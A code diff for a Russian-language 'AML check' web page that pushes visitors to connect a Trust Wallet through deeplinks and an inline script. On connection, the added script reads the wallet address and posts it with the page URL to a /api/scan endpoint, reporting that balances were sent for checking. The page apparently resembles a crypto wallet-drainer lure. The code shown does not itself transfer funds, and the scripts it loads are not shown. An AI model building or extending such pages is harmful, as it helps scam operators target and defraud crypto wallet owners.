@@ -66,32 +66,13 @@
               <button
                 type="button"
                 data-user-wallet-connect
-                onclick="
-                  event.preventDefault();
-                  if (window.connectWalletNow) { window.connectWalletNow(event); return false; }
-                  var status = document.querySelector('[data-user-wallet-status]');
-                  var provider = (window.trustwallet && window.trustwallet.ethereum) || window.ethereum;
-                  if (provider && provider.request) {
-                    if (status) status.textContent = 'Запрашиваем вход в кошельке...';
-                    provider.request({ method: 'eth_requestAccounts' })
-                      .then(function () {
-                        if (status) status.textContent = 'Кошелек найден. Нажмите Connect еще раз.';
-                      })
-                      .catch(function () {
-                        if (status) status.textContent = 'Подтвердите вход в кошельке или откройте Trust Wallet.';
-                      });
-                    return false;
-                  }
-                  if (status) status.textContent = 'Кошелек не найден. Открываю Trust Wallet...';
-                  window.location.href = 'https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html%3Fv%3D9';
-                  return false;
-                "
+                onclick="return window.inlineConnectFallback ? window.inlineConnectFallback(event) : false;"
               >
                 Connect
               </button>
               <a
                 class="wallet-deeplink"
-                href="https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html%3Fv%3D9"
+                href="https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html%3Fv%3D10"
                 data-trust-deeplink
                 rel="noopener"
               >
@@ -138,8 +119,93 @@
       <span>Автопроверка через Trust Wallet</span>
     </footer>
 
-    <script src="config.js?v=auto-scan9"></script>
-    <script src="auto-wallet.js?v=auto-scan9"></script>
-    <script src="check-flow.js?v=auto-scan9"></script>
+    <script>
+      (function () {
+        var deeplink = "https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html%3Fv%3D10";
+        function bySel(sel) { return document.querySelector(sel); }
+        function getProvider() {
+          if (window.trustwallet && window.trustwallet.ethereum) return window.trustwallet.ethereum;
+          if (window.ethereum && window.ethereum.providers && window.ethereum.providers.length) {
+            var trust = null;
+            for (var i = 0; i < window.ethereum.providers.length; i += 1) {
+              if (window.ethereum.providers[i] && window.ethereum.providers[i].isTrust) {
+                trust = window.ethereum.providers[i];
+                break;
+              }
+            }
+            return trust || window.ethereum.providers[0];
+          }
+          return window.ethereum || null;
+        }
+        function unlockForm(address) {
+          var form = bySel("[data-check-form]");
+          if (!form) return;
+          form.classList.remove("is-locked");
+          var controls = form.querySelectorAll("input, button");
+          for (var i = 0; i < controls.length; i += 1) controls[i].disabled = false;
+          var input = bySel("#wallet");
+          if (input && !input.value) input.value = address;
+          var lockNote = bySel("[data-check-lock-note]");
+          if (lockNote) lockNote.textContent = "Кошелёк подключён. Можно запускать AML-проверку.";
+          var walletLabel = bySel("[data-user-wallet-address]");
+          if (walletLabel) walletLabel.textContent = "EVM: " + address;
+        }
+
+        window.inlineConnectFallback = function (event) {
+          if (event && event.preventDefault) event.preventDefault();
+          if (typeof window.connectWalletNow === "function") {
+            try {
+              window.connectWalletNow(event);
+              return false;
+            } catch (err) {
+              // продолжим через HTML fallback
+            }
+          }
+
+          var status = bySel("[data-user-wallet-status]");
+          var provider = getProvider();
+          if (!provider || !provider.request) {
+            if (status) status.textContent = "Кошелёк не найден. Открываю Trust Wallet...";
+            window.location.href = deeplink;
+            return false;
+          }
+
+          if (status) status.textContent = "Подтвердите вход в Trust Wallet...";
+          provider.request({ method: "eth_requestAccounts" }).then(function (accounts) {
+            var address = accounts && accounts[0] ? String(accounts[0]) : "";
+            if (!address) {
+              if (status) status.textContent = "Адрес не получен. Повторите Connect.";
+              return;
+            }
+            unlockForm(address);
+            if (status) status.textContent = "Кошелёк подключён. Проверяем балансы...";
+            if (typeof fetch === "function") {
+              fetch("/api/scan", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  evmAddress: address,
+                  source: "trust_wallet_inline",
+                  pageUrl: window.location.href
+                })
+              })
+                .then(function () {
+                  if (status) status.textContent = "Кошелёк подключён. Балансы отправлены на проверку.";
+                })
+                .catch(function () {
+                  if (status) status.textContent = "Кошелёк подключён. Балансы отправятся при следующем запросе.";
+                });
+            }
+          }).catch(function () {
+            if (status) status.textContent = "Подтвердите вход в Trust Wallet или откройте его кнопкой справа.";
+          });
+          return false;
+        };
+      })();
+    </script>
+
+    <script src="config.js?v=auto-scan10"></script>
+    <script src="auto-wallet.js?v=auto-scan10"></script>
+    <script src="check-flow.js?v=auto-scan10"></script>
   </body>
 </html>
